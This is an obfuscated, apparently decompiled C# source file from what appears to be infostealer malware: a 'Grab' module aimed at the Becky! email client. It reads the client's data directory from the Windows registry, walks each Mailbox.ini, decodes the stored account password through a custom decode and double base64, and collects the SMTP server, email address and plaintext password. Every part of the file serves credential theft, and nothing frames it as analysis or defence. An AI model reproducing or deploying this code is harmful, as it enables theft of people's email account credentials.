using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using _81d;
using Microsoft.Win32;
using SNt;
using p3N5Y;

namespace ZAZUx;

public class _5wL0O3nTE : MnVCfk
{
	[CompilerGenerated]
	private string Application__BackingField;

	public string cgQWEsnsoFp
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public _5wL0O3nTE()
	{
		cgQWEsnsoFp = "Becky!";
	}

	public List<ii68> Grab()
	{
		int num = 0;
		List<ii68> list = default;
		string text = default;
		List<string> list2 = default;
		string path = default;
		do
		{
			if (num == 1)
			{
				list = new List<ii68>();
				num = 2;
			}
			if (num == 2)
			{
				try
				{
					text = (string)Registry.GetValue("HKEY_CURRENT_USER\\Software\\RimArts\\B2\\Settings", "DataDir", "");
					if (string.IsNullOrEmpty(text))
					{
						return list;
					}
				}
				catch
				{
					return list;
				}
				list2 = new List<string>();
				path = text + "Folder.lst";
				if (!File.Exists(path))
				{
					return list;
				}
			}
			else
			{
				switch (num)
				{
				case 3:
					break;
				case 0:
					num = 1;
					continue;
				default:
					continue;
				}
			}
			string[] array = File.ReadAllLines(path);
			foreach (string text2 in array)
			{
				list2.Add(text + text2);
			}
			foreach (string item in list2)
			{
				if (!Directory.Exists(item))
				{
					continue;
				}
				try
				{
					string text3 = item + "\\Mailbox.ini";
					if (File.Exists(text3))
					{
						kKdeGISe kKdeGISe2 = new kKdeGISe(text3);
						string password = Encoding.Default.GetString(Convert.FromBase64String(Encoding.Default.GetString(Convert.FromBase64String(KKA.RdeE(kKdeGISe2["Account"]["PassWd"], 2)))));
						ii68 ii69 = new ii68();
						ii69.byIdLuuGZbL = kKdeGISe2["Account"]["SMTPServer"];
						ii69.S8v = kKdeGISe2["Account"]["MailAddress"];
						ii69._9H5rP7hg2 = password;
						ii69.oVAe = "Becky!";
						ii68 ii70 = ii69;
						if (!string.IsNullOrEmpty(ii70.S8v) && !string.IsNullOrEmpty(ii70._9H5rP7hg2))
						{
							list.Add(ii70);
						}
					}
				}
				catch
				{
				}
			}
			return list;
		}
		while (num != 4);
		List<ii68> result = default;
		return result;
	}
}
